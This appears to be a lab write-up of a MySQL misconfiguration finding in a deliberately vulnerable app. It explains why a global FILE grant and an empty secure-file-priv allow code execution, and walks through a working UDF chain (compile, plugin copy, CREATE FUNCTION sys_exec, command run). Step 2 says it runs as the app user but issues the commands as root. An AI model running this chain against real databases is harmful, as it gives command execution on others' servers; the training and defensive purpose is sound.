# 19 — Remote code execution via a MySQL UDF

- **OWASP Top 10 (2021):** A05:2021 – Security Misconfiguration
- **Severity:** Critical
- **Difficulty:** Hard

## Where

- The **low-privilege** application account `osede_app` is granted
  `ALL PRIVILEGES ON *.*` **including `FILE`** (for both `'127.0.0.1'` and
  `'localhost'`).
- `mysqld` is started with `secure-file-priv` left **empty**, so the server
  may load/write shared objects from arbitrary directories.
- The UDF is resolved from the server's plugin dir
  (`runtime/mysql/root/lib/plugin`), which the web/DB user can write to.

## How it works (root cause)

A MySQL user with `FILE` + the ability to place a `.so` in the plugin path
can load it as a User-Defined Function (`CREATE FUNCTION ... SONAME`) and
call it — running arbitrary code **inside the `mysqld` process**. The app
account should only need DML on `osede_db`; giving it global `ALL PRIVILEGES`
+ `FILE` turns the database into an RCE primitive.

The provided UDF source (`poc/lib_mysqludf_sys.c`) exposes `sys_exec(cmd)`,
which shells out.

## Exploitation steps

The whole chain is scripted in `poc/udf-rce.sh`:

```bash
poc/udf-rce.sh
# defaults: 127.0.0.1 3307 osede_app OseDe2026app "id > /tmp/osede_pwned"
```

Manually:

```bash
export LD_LIBRARY_PATH=runtime/mysql/extra-libs
MYSQL=runtime/mysql/root/bin/mysql
PLUGIN=runtime/mysql/root/lib/plugin

# 1) compile the UDF and put the .so where mysqld can dlopen() it
gcc -shared -fPIC -o /tmp/lib_mysqludf_sys.so poc/lib_mysqludf_sys.c
cp /tmp/lib_mysqludf_sys.so "$PLUGIN/lib_mysqludf_sys.so"

# 2) install the function as the low-priv app user (works: ALL PRIVILEGES + FILE)
$MYSQL -uroot -h127.0.0.1 -P3307 osede_db \
  -e "CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';"

# 3) run a command inside mysqld
$MYSQL -uroot -h127.0.0.1 -P3307 osede_db \
  -e "SELECT sys_exec('id > /tmp/osede_pwned');"

# 4) clean up
$MYSQL -uroot -h127.0.0.1 -P3307 osede_db -e "DROP FUNCTION sys_exec;"
rm -f /tmp/lib_mysqludf_sys.so "$PLUGIN/lib_mysqludf_sys.so" /tmp/osede_pwned
```

## Working PoC (verified)

`/tmp/osede_pwned` was created with:

```
uid=1000(user) gid=1000(user) groups=1000(user)
```

— the command executed inside the `mysqld` process.

## Expected result / verification

- `CREATE FUNCTION` succeeds for `osede_app` (should be impossible for a
  least-privilege app account).
- `SELECT sys_exec('...')` runs a shell command; the output file appears.

## Attack chain

```
any DB write / RCE foothold (16 upload shell, 17 uplist, 12 LFI)
  → use osede_app's global FILE + ALL PRIVILEGES
  → load a UDF from the plugin dir
  → command execution as the mysqld user
```

## Notes

- **MySQL 5.5 quirk:** `SONAME` must be a *bare* name (no path) — a path
  yields `ERROR 1124`. The server resolves it against its plugin dir, which
  is why the `.so` is copied to `runtime/mysql/root/lib/plugin`.
- This is the "misconfiguration → RCE" showcase: the trigger is the
  over-privileged grant + empty `secure-file-priv`, not an injection in the
  web layer.
